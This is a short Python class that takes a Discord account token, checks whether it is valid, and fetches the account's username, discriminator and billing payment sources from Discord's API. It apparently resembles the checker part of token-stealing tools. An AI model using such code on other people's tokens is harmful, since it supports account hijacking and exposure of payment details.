import requests,json

class Discord:
    def __init__(self,token):
        self.token = token
        self.headers = {'Authorization': self.token, 'Content-Type': 'application/json'}
        self.USER_DATA_URL = 'https://discordapp.com/api/v9/users/@me'
        self.USER_BILLING_URL = 'https://discordapp.com/api/v9/users/@me/billing/payment-sources'
        self.USER_DATA = requests.get(self.USER_DATA_URL, headers=self.headers).text
        self.USER_DATA = json.loads(self.USER_DATA)
        self.USER_BILLING = requests.get(self.USER_BILLING_URL, headers=self.headers).text
        self.USER_BILLING = json.loads(self.USER_BILLING)

    def is_valid(self):
        try:
            self.USER_DATA['username']
            return True
        except:
            return False

    def get_username(self):
        return self.USER_DATA['username']

    def get_discriminator(self):
        return self.USER_DATA['discriminator']